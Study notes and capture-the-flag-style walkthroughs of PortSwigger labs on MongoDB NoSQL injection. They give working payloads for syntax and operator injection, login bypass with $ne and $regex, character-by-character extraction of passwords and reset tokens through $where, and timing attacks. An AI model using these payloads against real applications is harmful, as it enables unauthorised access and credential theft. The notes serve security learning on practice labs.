# NoSQL Injection Notes

[Portswigger](https://portswigger.net/web-security/nosql-injection)

## Methodology

Two types of NoSQL injection:
- syntax injection - when you break NoSQL query syntax, enabling you to inject your own paylod. similar to SQL injection
- operator injection - when you can use NoSQL query operators to manipulate queries

To detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this, systematically test each input by submitting fuzz strings and special characters that trigger a database error or some other detectable behavior if they're not adequately sanitized or filtered by the application. 

### Detecting syntax injection in MongoDB

If you have an app that is doing an API call like: `https://insecure-website.com/product/lookup?category=fizzy`

We can defer that it is doing a query like: `this.category == 'fizzy'`

Sample fuzz string test:

```
'"`{
;$Foo}
$Foo \xYZ
```

Attack will look like: `https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`

In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become 

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

### Determining which characters are processed

inject individual characters to determine if they are interpreted as syntax by the application, this is testing the `'` character: `this.category == '''`

can confirm by escaping the character with `\` in the query: `this.category == '\''`

if this doesn't cause a syntax error, this means you might have an injection attack possibility

### Confirming conditional behavior

next step is to determine whether you can influence boolean conditions using NoSQL syntax

send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x`

Like:
```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

### Overriding existing conditions

you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`

```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

This results in the following MongoDB query: 

```
this.category == 'fizzy'||'1'=='1'
```

As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories. 

**Null character testing**

You can also add a null character after the category value, the DB may ignore all characters after a null character

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

### NoSQL operator injection

Examples of MongoDB query operators:
- $where
- $ne
- $in
- $regex

**Submitting query operators**

In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

    Convert the request method from GET to POST.
    Change the Content-Type header to application/json.
    Add JSON to the message body.
    Inject query operators in the JSON.

Note you can use the Content-Type converter extension to change things like:
- JSON to XML
- XML to JSON
- Body parameters to JSON
- Body parameters to XML

### Detecting operator injection in MongoDB

Consider a vulnerable application that accepts a username and password in the body of a `POST` request:

```
{"username":"wiener","password":"peter"}
```

Test each input with a range of operators, for example to test whether the username input processes the query operator: `{"username":{"$ne":"invalid"},"password":"peter"}`

When executed this will pull all the users with usernames not equal to `invalid`

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload: `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

As a result, you're logged into the application as the first user in the collection. To target an account do something like: `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

### Exploiting syntax injection to extract data 

**Exfiltrating data in MongoDB**

Consider a vulnerable application that allows users to look up other registered usernames and displays their role:
`https://insecure-website.com/user/lookup?username=admin`

This results in the following NoSQL query of the `users` collection:
`{"$where":"this.username == 'admin'"}`

As the query uses the $where operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload: `admin' && this.password[0] == 'a' || 'a'=='b`

This returns the first character of the users password string letting you to be able to extract the password character by character

You could also use the JavScript `match()` funciton to extrac info: `admin' && this.password.match(/\d/) || 'a'=='b`

**identifying field names**

For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:
`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`

Send the payload again for an existing field and for a field that doesn't exit: 
username field exists: `admin' && this.username!='`
foo doesn't: `admin' && this.foo!='`

### Exploiting NoSQL operator injection to extract data

**injecting operators in MongoDB**

Consider a vulnerable application that accepts username and password in the body of a `POST` request:
`{"username":"wiener","password":"peter"}`

Try adding the $where operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true:

False: `{"username":"wiener","password":"peter", "$where":"0"}`
True: `{"username":"wiener","password":"peter", "$where":"1"}`

**Extracing field names**

If you have injected an operator that enables you to run JavaScript you may be able to use the `keys()` method to extract the name of data fields:
`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

**Exfiltrating data using operators**

Consider a vulnerable application that accepts a username and password in the body of a POST request: `{"username":"myuser","password":"mypass"}`

You could start by testing whether the `$regex` operator is processed as follows:
`{"username":"admin","password":{"$regex":"^.*"}}`

If the response to this request is different to the one you receive when you submit an incorrect password, this inidcates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. Example, the following payload checks the password begins with an `a`:
`{"username":"admin","password":{"$regex":"^a*"}}`

### Timing based injection

To conduct timing-based NoSQL injection:
- load the page several times to determine a baseline loading time
- insert a timing based payload into the input, for example: `{"$where": "sleep(5000)"}`
- identify whether the response loads more slowly, this indicates a successful injection

Example timing based payloads that will trigger a time delay if the password begins with the `a`:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

## Labs walkthrough

### Detecting NoSQL injection

Background:

```
The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection. 
```

- access lab and click on a product category filter
- in burp history find the filter request and send to repeater
- in repeater, submit a `'` character in the category parameter, notice that this causes a JavaScript syntax error
- submit a valid JavaScript payload in the category param: `Gifts'+'`, make sure you URL encode it
- identify whether you can inject boolean conditions:
  - submit false condition: `Gifts' && 0 && 'x`
  - submit true condition: `Gifts' && 1 && 'x`
- submit a boolean condition that always evaluates to true in the category param: `Gifts'||1||'`
- right click the response and select `show response in browser`
- copy the URL and load it

### Exploiting NoSQL operator injection to bypass authentication

Background: 

```
The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the administrator user.

You can log in to your own account using the following credentials: wiener:peter. 
```

- log into the application, go to burp history and send the `POST /login` request to repeater
- test the username and password parameters
  - from `"wiener"` to `{"$ne":""}` then send the request
  - change the value of the username param from `{"$ne":""}` to `{"$regex":"wien.*"}` and notice that you can also log in when using the `$regex` operator
  - with the username param set as `{"$ne":""}` schange the value of the password param from `peter` to `{"$ne":""}` now send this and notice that this causes the query to return an unexpected number of records
- with the password params set as `{"$ne":""}` change the value of the username param to `{"$regex":"admin.*"},` then send again, notice that this logs you in as the admin user
- right click the response and select `show response in browser`, copy this URL and open in browser

### Exploiting NoSQL injection to extract data

Background: 

```
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, extract the password for the administrator user, then log in to their account.

You can log in to your own account using the following credentials: wiener:peter. 
```

Tip: The password only uses lowercase letters

- log into the lab and in burps history select the `GET /user/lookup?user=wiener` request and send to repeater
- submit a `'` character in the user parameter, notice this causes an error
- submit a valid JavaScript payload in the `user` param, for example: `wiener'+'`, notice that it retrieves the account details for the wiener user indicating that a form of serverside injection may be occurring
- identify whether you can inject boolean conditions to change the response:
  - submit a false condition in the `user` param: `wiener' && '1'=='2`, notice this gives a `Could not find user` error
  - submit a true condition: `wiener' && '1'=='1` notice that this doesn't cause an error
- identify the password length
  - change the user param to `administrator' && this.password.length < 30 || 'a'=='b` notice that the response retrieves the account details for the administrator user, indicating that the password is less than 30 characters
  - reduce the password length in the payload, then resend the request
  - continue to try different lengths
  - notice that when you submit the value `9` you retrieve the account details for the `administrator` user but when you submit the value `8` you receive an error message indicating that the password is 8 characters long
- send this request to intruder
- in intruder enumerate the password:
  - change the user param to `administrator' && this.password[§0§]=='§a§`
  - select `cluster bomb attack` from the attack type drop down menu
  - in the paylo0ads side panel, select position `1` from the `payload position` drop down list, add the numbers from `0-7`
  - select position `2` from the payload position drop down list, use the built-in `a-z` list
  - click start attack
  - sort the attack results by `payload 1` then `length` notice that one request for each character position has evaluated to trye and retrieved the details for the administrator user
- use found creds to log in as `administrator` 

### Exploiting NoSQL operator injection to extract unknown fields

Background:

```
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, you'll first need to exfiltrate the value of the password reset token for the user carlos. 
```

- attempt to log in to the application with `carlos` username and password `invalid`
- in burp history find the `POST /login` request and send to repeater
- change the password param to `{"$ne":"invalid"}` then send. notice that you now receive an `account locked` error message, you can't access carlos' account, but this response indicates that the `$ne` operator has been accepted and the application is vulnerable
- in browser attempt to reset the password for the `carlos` account, when you submit the `carlos` username observe that the reset mechanism involves email verification, so you can't reset the account yourself
- in repeater use the `POST /login` request to test whether the application is vulnerable to JavaScript injection:
  - add `"$where": "0"` as an additional param in the JSON data: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`
  - send the request, notice that you receive an `invalid username or password` error message
  - change `"$where": "0"` to `"$where": "1"` then resend and notice you get an `account locked` error message, meaning the `$where` clause is being evaluated
- send request to intruder, in intruder do the following:
  - update the `$where` param as: `"$where":"Object.keys(this)[1].match('^.{}.*')"`
  - add two payload positions as shown: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`
  - select `cluster bomb attack`
  - in `payloads` select the first position one, then set the `payload type` to `numbers` set the number range as `0-20`
  - in position 2 set the `payload type` as `simple list` and use the `a-z`, `A-Z` and `0-9` lists
  - start attack
  - sort the attack results by `payload 1` then `length` to identify responses with an `account locked` message insread of the `invalid username or pass word` message
  - repeat the above steps to identify further JSON parameters, you can do this by incrementing the index of the keys array with each attempt like: `"$where":"Object.keys(this)[2].match('^.{}.*')"`, notice that one of the JSON parameters is for a password reset token


















